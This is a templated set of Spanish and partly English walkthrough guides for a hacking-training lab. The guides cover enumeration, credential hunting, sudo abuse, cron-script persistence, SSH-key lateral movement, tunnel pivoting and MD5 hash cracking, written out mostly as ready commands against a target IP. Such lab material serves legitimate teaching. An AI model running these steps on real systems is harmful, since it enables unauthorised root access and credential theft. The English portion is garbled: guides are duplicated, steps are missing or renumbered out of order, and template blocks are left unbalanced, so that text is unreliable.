{% if host_lab_id == 'host_enum' %}

Guía completa — Enumeración de red y servicios

  1. Comprueba conectividad con el objetivo (usa -Pn si ICMP está filtrado): 
    ping -c 1 {{ target_ip }}
  2. Escanea todos los puertos TCP para no perderte servicios en puertos altos: 
    nmap -Pn -p- --min-rate 2000 {{ target_ip }}
  3. Lanza scripts por defecto y detección de versión sobre los puertos abiertos: 
    nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}
  4. Nmap agrupa varias versiones de vsftpd bajo un mismo banner genérico. Conecta directamente al servicio para leer su banner exacto: 
    printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21
  5. Completa el mapa del objetivo revisando también SMB y HTTP: 
    smbclient -N -L //{{ target_ip }}/
curl -sI {{ target_base }}/
  6. Responde con el producto y la versión exactos que aparecen en la línea 220 del banner FTP.
{% elif host_lab_id == 'credential_hunting' %}

Guía completa — Credential Hunting

  1. Conéctate con la shell obtenida en H02/H03 y confirma tu identidad: 
    ssh admin@{{ target_ip }}
id
whoami
  2. Busca ficheros de configuración, variables de entorno e historiales legibles fuera de tu propio home: 
    find /opt /var/www /home -type f \( -name '.env' -o -name '*.conf' -o -name '*history*' \) -readable 2>/dev/null
  3. Filtra su contenido en busca de credenciales, tokens y rutas sensibles: 
    grep -RniE 'password|secret|token|key|marker' /opt /home 2>/dev/null
  4. Inspecciona el fichero de configuración de producción localizado: 
    cat /opt/hacklabs/app/.env
  5. El fichero revela, entre otras cosas, la ruta de la base de datos, la ubicación de una clave SSH de backups y el marcador de este laboratorio. Valídalo en la caja «Validar Flag».
{% elif host_lab_id == 'sudo_suid' %}

Guía completa — Abuso de sudo mal configurado

  1. Conéctate con la shell de admin (obtenida en H02/H03) y comprueba qué puede ejecutar con privilegios: 
    ssh admin@{{ target_ip }}
sudo -l
  2. El resultado muestra (ALL) NOPASSWD: ALL: admin puede ejecutar cualquier comando como root sin necesidad de contraseña. Es una de las configuraciones de sudoers más peligrosas — y, por desgracia, más habituales en entornos reales.
  3. Abre una shell interactiva como root directamente: 
    sudo -i
id
  4. Lee el artefacto protegido que solo root puede leer: 
    cat /root/host-labs/h07.txt
  5. Lección de auditoría real: tras cualquier acceso inicial, sudo -l es de los primeros comandos que debe ejecutar un pentester — una entrada NOPASSWD: ALL equivale a acceso root inmediato, sin necesidad de exploits.
{% elif host_lab_id == 'cron_persistence' %}

Guía completa — Persistencia por cron

  1. Conéctate y enumera las tareas programadas del sistema: 
    ssh admin@{{ target_ip }}
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/hacklabs-telemetry
  2. La tarea se ejecuta como root cada minuto e invoca un script. Comprueba sus permisos: 
    ls -la /opt/hostlabs/telemetry.sh
cat /opt/hostlabs/telemetry.sh
  3. El script pertenece a root pero es escribible por cualquier usuario (777). Añádele una orden que copie el artefacto protegido a una ruta legible por ti: 
    echo 'cp /root/host-labs/h08.txt /tmp/h08-proof.txt; chmod 644 /tmp/h08-proof.txt' >> /opt/hostlabs/telemetry.sh
  4. Espera a la siguiente ejecución de cron (se dispara cada minuto) y lee el resultado: 
    sleep 65
cat /tmp/h08-proof.txt
  5. Restaura el script a su estado original para no interferir con otros intentos: 
    cat > /opt/hostlabs/telemetry.sh << 'EOF'
#!/bin/sh
find /var/log -type f -name '*.log' -mtime +30 -delete 2>/dev/null
EOF
{% elif host_lab_id == 'ssh_lateral' %}

Guía completa — Movimiento lateral por claves SSH

  1. Conéctate como admin y busca claves privadas legibles fuera de tu propio home: 
    ssh admin@{{ target_ip }}
find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2>/dev/null
  2. Copia la clave localizada y ajusta sus permisos (SSH rechaza claves con permisos demasiado abiertos): 
    cp /opt/backups/.ssh/id_rsa /tmp/backup_key
chmod 600 /tmp/backup_key
  3. Deriva su clave pública para identificar a qué cuenta pertenece: 
    ssh-keygen -y -f /tmp/backup_key
  4. Confirma que esa clave pública está autorizada en otra cuenta del sistema: 
    cat /home/svc-backup/.ssh/authorized_keys
  5. Usa la clave para autenticarte directamente como esa identidad: 
    ssh -i /tmp/backup_key svc-backup@{{ target_ip }}
id
  6. Enumera el nuevo home y recupera el marcador de movimiento lateral: 
    cat lateral.txt
{% elif host_lab_id == 'network_pivoting' %}

Guía completa — Pivoting mediante túnel SSH

  1. Conéctate y busca servicios que solo escuchan en localhost: 
    ssh admin@{{ target_ip }}
ss -lntp
  2. Verás un servicio en 127.0.0.1:9090, inalcanzable desde fuera del host. Confírmalo desde Kali: 
    curl --connect-timeout 3 http://{{ target_ip }}:9090/
  3. Cierra esa sesión interactiva y abre en su lugar un túnel local que reenvíe ese puerto a tu máquina: 
    ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}
  4. En una segunda terminal de Kali, accede ahora al servicio a través del túnel: 
    curl http://127.0.0.1:9090/
  5. El contenido devuelto, accesible únicamente a través del túnel, contiene el marcador del laboratorio.
{% else %}

Guía completa — Acceso a base de datos

  1. Obtén una shell como admin (H02/H03) y localiza la configuración de producción: 
    ssh admin@{{ target_ip }}
find /opt -type f \( -name '.env' -o -name '*.db' \) -readable 2>/dev/null
cat /opt/hacklabs/app/.env
  2. El fichero indica el motor (SQLite) y la ruta de la base de datos. Conéctate y enumera las tablas: 
    sqlite3 /opt/hacklabs-db/production.db
.tables
.schema users
  3. Consulta las credenciales almacenadas: 
    SELECT username, password_hash, role FROM users;
.quit
  4. Copia a tu Kali la wordlist corporativa encontrada durante la fase de enumeración: 
    exit
scp admin@{{ target_ip }}:/opt/hacklabs/app/company-passwords.txt ./company-passwords.txt
  5. Guarda el hash MD5 devuelto por la consulta anterior (el de administrator) y crackéalo offline con la wordlist: 
    echo '<HASH_DEVUELTO_POR_LA_CONSULTA>' > hash.txt
hashcat -m 0 -a 0 hash.txt company-passwords.txt
hashcat -m 0 hash.txt --show
  6. Introduce la contraseña en claro recuperada como respuesta; no introduzcas el hash.
{% endif %}

Full guide — Network and service enumeration

  1. Check connectivity with the target (use -Pn if ICMP is filtered): 
    ping -c 1 {{ target_ip }}
  2. Scan every TCP port so you don't miss services on high ports:

    printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21
  5. Complete the picture by checking SMB and HTTP too: 
    smbclient -N -L //{{ target_ip }}/
curl -sI {{ target_base }}/
  6. Submit the exact product and version shown on the 220 line of the FTP banner.

{% elif host_lab_id == 'sudo_suid' %}

Full guide — Sudo misconfiguration abuse

  1. Connect with the admin shell (obtained in H02/H03) and check what it can run with elevated rights: 
    ssh admin@{{ target_ip }}
sudo -l
  2. The output shows (ALL) NOPASSWD: ALL: admin can run any command as root without a password. This is one of the most dangerous — and unfortunately common — sudoers misconfigurations found in real environments.
  3. Open a root interactive shell directly: 
    sudo -i
id
  4. Read the protected artifact that only root can read: 
    cat /root/host-labs/h07.txt
  5. Real audit takeaway: after any initial access, sudo -l is one of the first commands a pentester should run — a NOPASSWD: ALL entry is equivalent to immediate root access, no exploit required.

{% elif host_lab_id == 'ssh_lateral' %}

Full guide — SSH key lateral movement

  1. Connect as admin and find readable private keys outside your own home: 
    ssh admin@{{ target_ip }}
find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2>/dev/null
  2. Copy the key you found and fix its permissions (SSH rejects keys with overly open permissions): 
    cp /opt/backups/.ssh/id_rsa /tmp/backup_key
chmod 600 /tmp/backup_key
  3. Derive its public key to identify which account it belongs to: 
    ssh-keygen -y -f /tmp/backup_key
  4. Confirm that public key is authorized on another account of the system: 
    cat /home/svc-backup/.ssh/authorized_keys
  5. Use the key to authenticate directly as that identity: 
    ssh -i /tmp/backup_key svc-backup@{{ target_ip }}
id
  6. Enumerate the new home and recover the lateral-movement marker: 
    cat lateral.txt
{% elif host_lab_id == 'network_pivoting' %}

Full guide — SSH tunnel pivoting

  1. Connect and look for services that only listen on localhost: 
    ssh admin@{{ target_ip }}
ss -lntp
  2. You'll see a service on 127.0.0.1:9090, unreachable from outside the host. Confirm it from Kali: 
    curl --connect-timeout 3 http://{{ target_ip }}:9090/
  3. Close that interactive session and open a local forward instead, tunneling that port to your machine: 
    ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}
  4. In a second Kali terminal, request the service through the tunnel: 
    curl http://127.0.0.1:9090/
  5. The content returned, reachable only through the tunnel, contains the lab's marker.
